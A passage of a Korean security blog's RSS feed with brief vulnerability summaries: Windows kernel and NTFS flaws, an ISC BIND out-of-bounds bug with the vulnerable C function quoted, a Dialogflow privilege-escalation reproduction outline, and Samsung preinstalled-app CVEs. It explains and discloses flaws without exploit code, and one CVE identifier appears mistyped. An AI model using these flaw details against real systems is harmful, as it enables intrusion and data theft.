수 있게 합니다.</p></li><li><p>CVE-2021-31955</p><p>ntoskrnl.exe에 존재하는 정보 노출 취약점입니다. Windows OS의 SuperFetch 기능을 악용한 것으로 <code>NtQuerySystemInformation</code>함수에 의해 반환된 SuperFetch 정보 클래스에 EPROCESS 커널 주소를 포함하기 때문에 발생합니다.</p></li><li><p>CVE-2021-3195</p><p>ntfs.sys에 존재하는 heap-based buffer overflow취약점입니다.<code> NTFSQUeryEaUserEaList</code>는 파일에 대한 확장 attribute 목록을 처리하고 버퍼에 저장합니다. 해당 기능은 output 버퍼의 크기를 제어할 수 있고 32비트 alignment로 정렬합니다. Output 버퍼의 패딩 기능에 integer underflow 검사가 없어서 Heap overflow가 발생합니다.</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] ISC BIND 서버의 정보 유출 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/</link>
      <guid>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/</guid>
      <pubDate>Fri, 18 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/6/15/zdi-21-5</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/15/zdi-21-502-an-information-disclosure-bug-in-isc-bind-server">ZDI-21-502: AN INFORMATION DISCLOSURE BUG IN ISC BIND SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>BIND 9.11.31, 9.16.15 이전 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ISC사의 DNS 서버 소프트웨어인 BIND에서 발견된 정보 유출 취약점의 세부 정보가 공개되었습니다.</p><p><code>der_match_tag_and_length()</code> 함수는 태그를 매칭하고 네트워크 패킷에서 길이와 같은 필드를 파싱하는 함수로, 취약점이 발생하는 코드는 아래와 같습니다.</p><pre><code class="hljs jsx"><span class="hljs-keyword">static</span> int der_match_tag_and_length(<span class="hljs-keyword">const</span> unsigned char *p, size_t len, Der_class xclass,                 Der_type type, int tag, size_t *length_ret,  size_t *size) &#123;     size_t l, ret = <span class="hljs-number">0</span>;     int e;      e = der_match_tag(p, len, xclass, type, tag, &amp;l);     <span class="hljs-keyword">if</span> (e) &#123;         <span class="hljs-keyword">return</span> (e);     &#125;     p += l;     len -= l;     ret += l;     e = der_get_length(p, len, length_ret, &amp;l);  <span class="hljs-comment">// (1) </span>    <span class="hljs-keyword">if</span> (e) &#123;         <span class="hljs-keyword">return</span> (e);     &#125; ...&#125;</code></pre><p>해당 함수에서 호출하는 <code>der_get_length()</code> 함수의 인자 중 <code>length_ret</code>은 호출자에서 값에 대한 검증이 이뤄져야 하지만 해당 함수에서는 검증을 하지 않고 반환합니다. <code>der_match_tag_and_length()</code> 함수에서 반환된 검증되지 않은 길이 값은 이후 <a href="https://datatracker.ietf.org/doc/html/rfc4178#section-4.2.1">negTokenInit</a>을 디코딩하는 <code>decode_NegTokenInit()</code> 함수 내의 여러 검사에 사용되어 OOB Access로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      <category domain="https://hackyboiz.github.io/tags/out-of-bounds/">out-of-bounds</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] dialogflow.cloud.google.com 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/</link>
      <guid>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/</guid>
      <pubDate>Thu, 17 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://lalka-test.medium.com/google-vrp-privilege-escala</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://lalka-test.medium.com/google-vrp-privilege-escalation-on-https-dialogflow-cloud-google-com-599af6c4516d">[Google VRP] Privilege escalation on https://dialogflow.cloud.google.com)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://dialogflow.cloud.google.com/">https://dialogflow.cloud.google.com/</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Cloud Platform의 Dialogflow 콘솔 사이트 <a href="https://dialogflow.cloud.google.com에서/">https://dialogflow.cloud.google.com에서</a> 권한 상승이 발견되었습니다. 해당 취약점은 초대된 다른 사용자의 권한을 낮춰도 동작하지 않아 발생하였습니다. 취약점을 트리거하는 단계는 다음과 같습니다.</p><ol><li><a href="https://dialogflow.cloud.google.com/#/editAgent/{project}/">https://dialogflow.cloud.google.com/#/editAgent/{project}/</a> 설정으로 이동하여 “Developer” 권한을 가진 사용자를 초대합니다.</li><li>“Developer”를 “Reviewer”로 권한을 낮춥니다.</li><li>설정이 적용되어 Reviewer로 화면에는 표시되지만 사용자는 Developer 권한으로 모든 작업이 가능합니다.</li></ol><p><a href="https://console.cloud.google.com/iam-admin/%EC%97%90%EC%84%9C">https://console.cloud.google.com/iam-admin/에서</a> 확인하면 초대된 사용자의 권한이 처음에 Developer로 설정한 후 Reviewer로 수정하면 권한이 수정되지 않고 Developer + Reviewer의 권한이 적용되어 발생한 취약점입니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/gcp/">gcp</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Samsung mobile 기본 앱 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/</link>
      <guid>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/</guid>
      <pubDate>Wed, 16 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.oversecured.com/Two-weeks-of-securing-Samsun</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/">Two weeks of securing Samsung devices: Part 1</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Samsung mobile 기본 앱</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oversecured 팀이 삼성 모바일 기기에 기본 제공되는 앱에서 다수의 취약점을 발견했습니다. 해커는 해당 취약점들을 악용해 타겟 기기의 연락처, 통화, SMS/MMS에 접근하여 편집하고 관리자 권한으로 임의의 앱을 설치할 수 있습니다.</p><ul><li><p>CVE-2021-25388</p><p>Knox Core는 URI 파라미터 검증이 미흡해 해커가 임의의 앱을 설치하거나 임의의 파일을 탈취할 수 있습니다. </p></li><li><p>CVE-2021-25356</p><p>Managed Provisioning은 모든 상호작용의 승인을 확인하기 위한 보안 검사가 있습니다. 하지만 <code>com.samsung.knox.container.requestId</code>값이 설정되어있다면 이를 무시할 수 있어 해커는 임의의 앱을 설치하고 관리자 권한을 부여할 수 있습니다.</p></li><li><p>CVE-2021-25391</p><p>Secure Folder는 Intent redirection 취약점이 있어 해커가 읽기, 쓰기 작업을 가로챌 수 있습니다.</p></li><li><p>CVE-2021-25393</p><p>SecSetting은 intent에 대한 부적절한 sanitization 때문에 해커가 system uid 데이터에 접근 할 수 있습니다.</p></li><li><p>CVE-2021-25392</p><p>Samsung Dex는 부적절한 백업 경로 설정 때문에 해커가 이를 변경해 크리티컬 데이터를 노출시킬 수 있습니다.</p></li><li><p>CVE-2021-25397</p><p>TelephonyUI의 부적절한 Access control 때문에 해커는 TelephonyUI의 파일에 대한 쓰기 작업을 할 수 있습니다.</p></li><li><p>CVE-2021-25390</p><p>PhotoTable의 Intent redirection 취약점은 해커가 임의의 파일에 접근할 수 있게 합니다.</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
      
      <category domain="https://hackyboiz.github.io/tags/pre-installed-app/">pre-installed app</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
